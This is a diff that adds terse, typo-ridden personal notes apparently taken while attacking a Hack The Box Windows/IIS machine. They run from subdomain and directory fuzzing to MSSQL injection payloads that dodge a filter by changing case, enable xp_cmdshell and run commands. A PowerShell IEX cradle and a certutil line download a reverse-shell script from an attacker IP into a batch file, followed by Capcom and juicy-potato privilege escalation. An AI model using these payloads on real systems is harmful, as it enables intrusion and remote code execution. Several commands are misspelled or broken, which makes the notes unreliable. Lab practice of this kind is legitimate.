@@ -1,0 +1,82 @@
+google windows iis version release 
+
+vi /etc/hosts
+x.x.x.x streefighterclub.htb
+gobuster -w medium.txt -u  http://streefithterclub.htb -o aout.log
+
+wfuzz -w subdomains-top1mail-5000.txt  -u  streefightclub.htb -H 'Host: FUZZ.streefighterclub.htb' --hw 717
+gobuster -w medium.txt -u  http://members.streefithterclub.htb -o aout.log
+
+gobuster -w Logins.fuzz.txt -u members.streefighterclub.htb/old/
+
+netspeaker sql inject cheetsheet
+test xp_cmdshell_query enable
+
+sqlinjdect by change the 'case'
+3 union select 1,2,3,4,(SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value
+FROM  sys.configurations
+WHERE  name = 'xp_cmdshell' ;),6
+
+
+change the xp_cmdshell to Xp_CmdsHeLl
+
+check enable:
+3;SELECT CONVERT(INT,ISNULL(value, value_in_use)) AS config_value
+FROM sys.configurations
+WHERE name = 'Xp_cmDsHeLl' ;
+
+enable cmd_shell:
+exec sp_configure 'show advanced options', 1; exec sp_config 'xp_cmdshell', 1;reconfigure;-- -
+
+run comand:
+exec xp_cmdshell 'whoami'
+exec xp_cmdshell 'ping 127.0.0.1' test the cmd exec or not
+
+3;create table cmdout (ID  INT IDENTITY(1,1) ,output varchar(1024)); 
+3;insert into cmdout(output) exec Xp_cMdShell "whoami"; -- -
+3; select 1,2,3,4,(select top 1 output from cmdout),6 -- -
+3; select 1,2,3,4,(select  output from cmdout where id=1),6 -- -
+
+clear the file
+ls clear.bat
+-a--- clear.bat
+[System.IO.File]::open('c:\user\decoder\clear.bat', [System.IO.FileMode]::Truncate)
+
+escape sigle code use double single code
+
+echo 'powershell -nop -c "IEX(New-object Net.webclient).dowloadString(''http://ip/rv-445.ps1'')"' > clear.bat
+
+cerutil -encode cleat.bat c:\users
+sqlsrv\test
+
+copy /y NUL clean.bat
+
+certutil -urlcace -split -f http://10.10.14.3/launcher.ps1  c:\users\sqlsrv\launcher
+
+cmd.exe /c 'type c:\user\sqlsrv\laucher >> clean.bat'
+
+cmd.exe /c driverqury --Capcom
+
+fuzzysecurity capcom
+
+for i in $(find . -name *.ps1); do cat $i; echo ""; done > ../www/capcom.ps1
+
+
+certuilt -encode root.exe root.exe.b64
+
+test for seimpersonateprivilege
+echo "Test" > c:\windows\system32\spool\drivers\color\test.exe
+
+
+juicy-potate
+
+
+
+#include "stdafx.h"
+extern "C"{
+    __declspec(dllexport) int check();
+}
+
+int __cdecl check(){
+    return 1;
+}
